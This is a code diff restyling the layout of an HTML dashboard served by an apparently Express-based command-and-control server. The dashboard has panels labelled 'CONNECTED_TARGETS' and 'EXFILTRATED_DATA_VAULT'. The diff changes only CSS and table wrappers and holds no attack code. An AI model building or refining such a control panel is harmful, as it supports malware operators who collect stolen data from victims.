@@ -498,10 +498,11 @@ app.get('/', (req, res) => {
     <link rel="stylesheet" href="/c2/style.css">
     <style>
         @media (min-width: 1024px) { body { zoom: 0.9; } }
-        .card { padding: 18px !important; }
+        .container { max-width: 1400px !important; width: 95% !important; margin: 0 auto !important; }
+        .card { padding: 22px !important; overflow: visible !important; width: 100% !important; }
         table { width: 100% !important; border-collapse: separate !important; border-spacing: 0 6px !important; table-layout: auto !important; }
-        th { padding: 10px 8px !important; color: var(--neon-cyan) !important; font-family: 'Orbitron', sans-serif !important; font-size: 0.78rem !important; letter-spacing: 1px !important; text-transform: uppercase !important; white-space: nowrap !important; vertical-align: middle !important; }
-        td { padding: 10px 8px !important; font-size: 0.78rem !important; white-space: nowrap !important; vertical-align: middle !important; }
+        th { padding: 10px 10px !important; color: var(--neon-cyan) !important; font-family: 'Orbitron', sans-serif !important; font-size: 0.78rem !important; letter-spacing: 1px !important; text-transform: uppercase !important; white-space: nowrap !important; vertical-align: middle !important; }
+        td { padding: 10px 10px !important; font-size: 0.78rem !important; white-space: nowrap !important; vertical-align: middle !important; }
     </style>
 </head>
 <body>
@@ -513,7 +514,7 @@ app.get('/', (req, res) => {
 
         <div class="card" style="margin-top: 20px; border-left: 3px solid var(--neon-cyan);">
             <h2 style="text-align: center; color: var(--neon-cyan); margin-bottom: 20px;">CONNECTED_TARGETS</h2>
-            <div style="overflow-x: auto;">
+            <div style="width: 100%;">
                 <table>
                     <thead>
                         <tr>
@@ -544,7 +545,7 @@ app.get('/', (req, res) => {
                 <h2 style="margin: 0 auto 5px auto; color: var(--neon-cyan); text-align: center;">EXFILTRATED_DATA_VAULT</h2>
                 <span style="font-size: 0.7rem; color: #aaa; display: block; text-align: center;">TOTAL PAYLOADS: <b style="color: var(--neon-green);">${exfiltratedFiles.length}</b></span>
             </div>
-            <div style="overflow-x: auto;">
+            <div style="width: 100%;">
                 <table>
                     <thead>
                         <tr>
